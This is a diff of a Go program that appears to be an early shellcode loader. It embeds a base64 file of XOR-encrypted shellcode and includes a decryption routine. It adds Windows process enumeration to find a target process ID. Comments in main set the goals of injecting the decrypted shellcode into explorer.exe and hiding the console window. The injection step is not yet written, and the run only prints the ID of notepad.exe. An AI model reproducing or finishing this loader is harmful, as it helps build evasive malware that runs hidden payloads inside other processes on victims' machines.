@@ -1,22 +1,17 @@
 package main
 
 import (
-	"fmt"
-	"unsafe"
 	_ "embed"
 	b64 "encoding/base64"
-	"golang.org/x/sys/windows"
-)
+	"errors"
+	"fmt"
+	"log"
+	"os"
+	"strings"
+	"syscall"
+	"unsafe"
 
-var (
-	kernel32DLL   = windows.NewLazySystemDLL("kernel32.dll")
-	
-	lstrcmpiA = kernel32DLL.NewProc("lstrcmpiA")
-	CloseHandle = kernel32DLL.NewProc("CloseHandle")
-	Process32Next  = kernel32DLL.NewProc("Process32Next")
-	Process32First  = kernel32DLL.NewProc("Process32First")
-	CreateToolhelp32Snapshot = kernel32DLL.NewProc("CreateToolhelp32Snapshot")
-
+	win32 "golang.org/x/sys/windows"
 )
 
 //go:embed sc.xor.42.b64
@@ -24,6 +19,17 @@ var (
 // XOR Encrypted with '42'
 var enc_sc_b64 string 
 
+type WindowsProcess struct {
+	ProcessID       int
+	ParentProcessID int
+	Exe             string
+}
+
+func checkError(err error){
+	if err != nil {
+		log.Fatalln("[!] ERR:" ,err)
+	}
+}
 // https://kylewbanks.com/blog/xor-encryption-using-go
 // xor runs a XOR encryption on the input string, encrypting it if it hasn't already been,
 // and decrypting it if it has, using the key provided.
@@ -45,17 +51,99 @@ func decrypt_xor_shellcode(key string, encrypted_sc_b64 string)(output []byte){
 	 
 }
 
-func FindTarget()
+func newWindowsProcess(e *win32.ProcessEntry32) WindowsProcess {
+    // Find when the string ends for decoding
+    end := 0
+    for {
+        if e.ExeFile[end] == 0 {
+            break
+        }
+        end++
+    }
+
+    return WindowsProcess{
+        ProcessID:       int(e.ProcessID),
+        ParentProcessID: int(e.ParentProcessID),
+        Exe:             syscall.UTF16ToString(e.ExeFile[:end]),
+    }
+}
+
+
+func processes(procname string)([]WindowsProcess, error){
+
+	
+	var TH32CS_SNAPPROCESS uint32 = 0x00000002
+	var pe32 win32.ProcessEntry32
+		
+	//Get handle to snapshot of Windows Process List
+	hProcSnap, err := win32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+
+	checkError(err)
+	
+	//Defer the handle close
+	defer win32.CloseHandle(hProcSnap)
+
+	pe32.Size = uint32(unsafe.Sizeof(pe32))
+
+	// Get the first process 
+	if err := win32.Process32First(hProcSnap, &pe32); err != nil {
+		return nil, err
+	}
+	
+	results := make([]WindowsProcess, 0, 50)
+
+	for {
+		results = append(results, newWindowsProcess(&pe32))
+		
+		err := win32.Process32Next(hProcSnap, &pe32)
+        
+		if err != nil {
+            // windows sends ERROR_NO_MORE_FILES on last process
+            if err == syscall.ERROR_NO_MORE_FILES {
+				return results, nil
+            }
+            
+			return nil, err
+        }
+	}
+	
+}
+
+func FindTarget(procname string)(pid int, err error){
+	procs, err := processes(procname)
+
+	checkError(err)
+
+	for _, p := range procs {
+		if strings.ToLower(p.Exe) == strings.ToLower(procname){
+			return p.ProcessID, nil 
+		}
+	}
+
+	return 0, errors.New("[!] ERR: Process not found!") 
+	
+}
+
+
 func main() {
 	// objectives:
 	// embed encrypted shellcode from file into program
 	// decrypt shellcode (XOR)
 	// inject shellcode into explorer.exe
 	// get rid of console window (pop up)
-	key := "42"
-	sc := decrypt_xor_shellcode(key, enc_sc_b64)
 	
+	
+	//key := "42"
+	//sc := decrypt_xor_shellcode(key, enc_sc_b64)
+	pid, err := FindTarget("notepad.exe")
 
+	// Process is not found or other error
+	if err != nil { 
+		os.Exit(3)
+	}
+
+
+	fmt.Println(pid)
 	
 
 }
